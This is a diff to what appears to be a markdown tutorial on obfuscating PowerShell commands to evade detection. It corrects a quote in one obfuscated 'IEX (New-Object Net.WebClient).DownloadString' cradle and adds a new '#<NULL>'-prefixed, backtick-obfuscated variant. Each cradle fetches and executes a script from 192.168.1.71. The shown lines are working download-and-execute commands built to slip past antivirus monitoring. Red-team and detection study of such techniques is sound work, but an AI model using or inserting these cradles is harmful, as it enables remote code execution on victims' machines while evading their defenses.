@@ -604,7 +604,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 - String obfuscated<br />
 
-      I`E`X ('({0}w-Object {0}t.WebClient).{1}String("{2}19`2.16`8.1`.71/He`ll`o.ps`1")' -f'Ne','Download','http://)
+      I`E`X ('({0}w-Object {0}t.WebClient).{1}String("{2}19`2.16`8.1`.71/He`ll`o.ps`1")' -f'Ne','Download','http://')
 
 ![powershell obfuscation](http://i.cubeupload.com/p9j54c.jpg)
 
@@ -763,9 +763,10 @@ Here we can view the all process of encoding/decoding in powershell console
 
        powershell Invoke-Expression('if(0){{{0}}}' -f $(0 -as [char]) + New-Object Net.WebClient').DownloadString('http://192.168.1.71/Invoke-Hello.ps1')
 
-- OR
+- OR (using #<NULL> before the monitorized syscall)
 
-      powershell Write-Host "#<NULL>"; Invoke-Expression(New-Object Net.WebClient).DownloadString('http://192.168.1.71/Invoke-Hello.ps1')
+      powershell Write-Host "#<NULL>"; I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.16`8.1`.7`1/In`vok`e-He`ll`o.ps`1")' -f'Ne','Download','http://','lie')
+
 
 - For file contents<br />
 
